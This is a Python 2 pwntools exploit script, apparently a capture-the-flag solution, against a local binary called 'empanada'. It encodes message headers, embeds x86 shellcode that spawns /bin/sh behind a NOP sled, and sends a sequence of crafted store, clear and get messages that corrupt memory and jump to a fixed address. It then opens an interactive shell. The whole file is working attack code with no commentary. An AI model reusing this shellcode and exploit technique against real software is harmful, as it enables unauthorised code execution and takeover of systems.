#!/usr/bin/python
from pwn import *

def mheader(type, size, idx):
  byte = type << 7 | size | idx << 5
  print hex(byte)
  return chr(byte)

class cmd:
  clear_invalid = chr(0xfe)
  get_count = chr(0x40)
  del_msg = chr(0x50)
  get_all_msg = chr(0x60)
  get_msg = chr(0x30)
  get_hash = chr(0x20)
  store_msg = chr(0x10)
  del_all = chr(0)

sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
sc = '\x90'*(0x1e - len(sc)) + sc

print len(sc)

p = process('./empanada')

p.send(mheader(1, 0x1f, 1))
p.send(cmd.store_msg + sc)
p.send(mheader(0, 0x1f, 1))
p.send(cmd.store_msg + 'a'*0x1e)
p.send(mheader(0, 0x1f, 0))
p.send(cmd.store_msg + 'a'*0x1e)

p.send(mheader(1, 0x1f, 1))
p.send(cmd.store_msg + 'b'*0x1e)
p.send(mheader(0, 0x1f, 1))
p.send(cmd.store_msg + 'b'*0x1e)
p.send(mheader(0, 0x1f, 0))
p.send(cmd.store_msg + 'b'*0x1e)

p.send(mheader(1, 0x1f, 0))
p.send(cmd.clear_invalid + 'A'*0x1e)
raw_input()

p.send(mheader(1, 0x10, 0))
p.send(cmd.store_msg + 'B' + p32(0x31337010)*3 + 'B'*2)

p.send(mheader(1, 0x1f, 0))
p.send(cmd.get_msg + chr(0) + 'd'*0x1d)

p.send(mheader(1, 0x1f, 0))
p.send(cmd.clear_invalid + 'A'*0x1e)

p.interactive()
